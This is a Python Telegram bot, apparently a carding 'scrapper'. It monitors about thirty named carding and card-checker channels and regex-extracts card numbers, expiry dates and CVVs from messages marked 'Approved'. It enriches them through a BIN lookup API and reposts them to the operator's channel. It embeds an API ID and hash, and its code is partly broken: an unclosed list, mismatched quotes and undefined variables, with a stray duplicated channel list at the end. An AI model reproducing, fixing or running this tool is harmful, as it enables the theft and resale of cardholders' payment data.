import time
import telethon
import asyncio
import os, sys
import re
from telethon import TelegramClient, events
import random
from telethon import Button
import requests
from time import sleep

API_ID =  27337131 #tu api id bb
API_HASH = '695a43d29e73423ad4142b20a736ea42'  #tu api hash bb
SEND_CHAT = -1001850450912 #chat o canal donde quieres que se envien las ccs

client = TelegramClient('session', API_ID, API_HASH)

chats  = [
    '@CCAUTH',
    '@secretgroup01',
    '@BinSkillerChat',
    '@Venexchk',
    '@JohnnySinsChat',
    '@leonbinerss',
    '@OficialScorpionsGrupo',
    '@RemChatChk',
    '@alterchkchat',
    '@AssociatonBinners1',
    '@dSnowChat',
    '@CHKBINS',
    '@cardesclub',
    '@BinsHellChat', 
    '@secretgroup01',
    '@BinSkillerChat',
    '@RickPrimeChkFree',
    '@fbinschat',   
    '@RickPrimeChkFree',
    '@savagegroupoficial',
    '@savagegroupoficial', 
    '@CHECKEREstefany_bot', 
    '@CuartelCardingGrupo',
    '@CHECKEREstefany_bot', 
    '@astachkccs', 
    '@bcycc',
    '@fbinschat',
    '@MUGIWARAAC',     
    '@GodsOfTheBins',     
    '@fbinschat',     
    '@CuartelCardingGrupo',  
    '@botsakuraa',
    '@ArthurChkGroup',
    '@Sammy0007_Chat'
      
      
 

PALABRAS_CLAVE = [
 
     "Approved",
     "Succeeded! 🤑",
     "APPROVED",
     "APPROVED ✅",
     "✅✅✅ Approved ✅✅✅",
     "Approved CCN",                    
     "Approved #AUTH! ✅",
     "Approved ❇️",
     "APPROVED ✅",
     "APPROVED ✓",
     "✅Appr0ved",
     "Security code incorrect✅",
     "Approved ❇️",
     "CVV2 FAILURE POSSIBLE CVV ⌯ N - AVS: G",
     "Succeeded!",
     "𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 𝑪𝒂𝒓𝒅 ✅",
     "𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅",                   
     "𝑪𝒉𝒂𝒓𝒈𝒆𝒅 𝟎.𝟐𝟓$",  
     "𝑪𝒉𝒂𝒓𝒈𝒆𝒅 $3 ✅",
     "Succeeded",   
     "Error: Your card has insufficient funds.",  
     "Subscription complete",             
     "CVV LIVE ✅",
     "Card Approved CCN/CCV Live",    
     "incorrect_cvc",
     "VIVA ✅",           
     "APPROVED ✓"
]



async def extract_cc_info(cc):
    pattern1 = r'\b(\d{4}\s?\d{4}\s?\d{4}\s?\d{4})\b|\b(\d{4}\s?\d{6}\s?\d{5})\b'
    pattern2 = r'\b(\d{4}\s?\d{4}\s?\d{4}\s?\d{3})\b|\b(\d{4}\s?\d{6}\s?\d{4})\b'
    match = re.search(pattern1, cc) or re.search(pattern2, cc)
    if match:
        cc_number = match.group(0).replace(' ', '')
        pattern = r'\b(\d{2})\b.*\b(\d{2}|\d{4})\b.*\b(\d{3})\b'
        match = re.search(pattern, cc)
        if match:
            if len(match.group(2)) == 2:
                ano = f"20{match.group(2)}"
            else:
                ano = match.group(2)
            return cc_number, match.group(1), ano, match.group(3)
    return None, None, None, None


def get_sent_cards():
    sent_cards = []
    if os.path.exists("cards.txt"):
        with open("cards.txt", "r") as f:
            sent_cards = [line.strip() for line in f.readlines()]
    return sent_cards

    

@client.on(events.MessageEdited(chats=chats))
async def new_order(event):
    try:

        contain_palabra_clave = False

        for palabra_clave in PALABRAS_CLAVE:
            if palabra_clave in event.message.message:
                contain_palabra_clave = True

        if contain_palabra_clave:
            cc = event.message.message
            cc_number, mes, ano, cvv = await extract_cc_info(cc)
            if cc_number is not None and mes is not None and ano is not None and cvv is not None:

                # Check if card has already been sent
                sent_cards = get_sent_cards()
                if cc_number in sent_cards:
                    return

                # Mark card as sent
                with open("cards.txt", "a") as f:
                    f.write(f"{cc_number}\n")

                # Rest of the code to send the message...


                bin = requests.get(f'https://bin-api-dragon.ga/bin/api/{cc_number[:6]}')
                if not bin:
                    return

                bin_json = bin.json()

                extra = cc_number[0:0 + 12]
                extra2 = cc_number[0:0 + 9]

                fullinfo = f"{cc_number}|{mes}|{ano}|{cvv}"
                plantilla = f"""
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
             **点 𝙸𝚋𝚊𝚒 𝚂𝚌𝚛𝚊𝚙𝚙𝚎𝚛 点**
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬                                     
**Card** ➪ `{cc_number}|{mes}|{ano}|{cvv}`
**Status ➪ Approved! ✅**
— — — — — — — — — — — — — — —
               **☘ INFO CARD ☘**
— — — — — — — — — — — — — — —
[🝂] 𝘽𝙞𝙣 𝗜𝗻𝗳𝗼 - `{cc_number[:6]}`
[🝂] 𝗜𝗻𝗳𝗼 - `{bin_json['data']['vendor']} - {bin_json['data]['type']} - {bin_json['data']['level']}`
[🝂] 𝘽𝙖𝙣𝙠 - `{bin_json['data']['bank']`
[🝂] 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 - `{bin_json['data]['country'] - {bin_json['data']['countryInfo']['emoji']}`
━━━━━━━━━━━━━━━━
[🝂] 𝗘𝘅𝘁𝗿𝗮 `{extra}xxxx|{mes}|{ano}|rnd`
━━━━━━━━━━━━━━━━
                """



                print(f'{cc_number}|{mes}|{ano}|{cvv}')
                with open('cards.txt', 'a') as w:
                    w.write(fullinfo + '\n')
                    def chooseRandomImage(directory="fotos"):
                        for img in os.listdir(directory): #Lists all files
                            ext = img.split(".")[len(img.split(".")) - 1]
                            if (ext in imgExtension):
                                allImages.append(img)
                        choice = random.randint(0, len(allImages) - 1)
                        chosenImage = allImages[choice] #Do Whatever you want with the image file
                        return chosenImage


                randomImage = chooseRandomImage()
              
                   
                await client.send_message(SEND_CHAT, plantilla, file = randomImage)
                time.sleep(1)    
               
    except Exception as ex:
        print(f'Exception: {ex}')
    
print('CODIGO EN LINEA @DARWINOFICIAL')
client.start()
client.run_until_disconnected()


'@CCAUTH',
    '@BinsHellChat',
    '@secretgroup01',
    '@BinSkillerChat',
    '@Venexchk',
    '@leonbinerss',
    '@RemChatChk',
    '@alterchkchat',
    '@AssociatonBinners1',
    '@dSnowChat',
    '@RickPrimeChkFree',
    '@CHKBINS',
    '@bcycc',
    '@fbinschat',
    '@savagegroupoficial',
    '@CHECKEREstefany_bot',
    '@CuartelCardingGrupo',
    '@CHECKEREstefany_bot',
    '@astachkccs',
    '@cardesclub',
    '@savagegroupoficial',
    '@GodsOfTheBins',
    '@fbinschat',
    '@CuartelCardingGrupo',                     '@botsakuraa',                              '@Sammy0007_Chat',                          '@SitesCCSChat',                            '@fbinschat'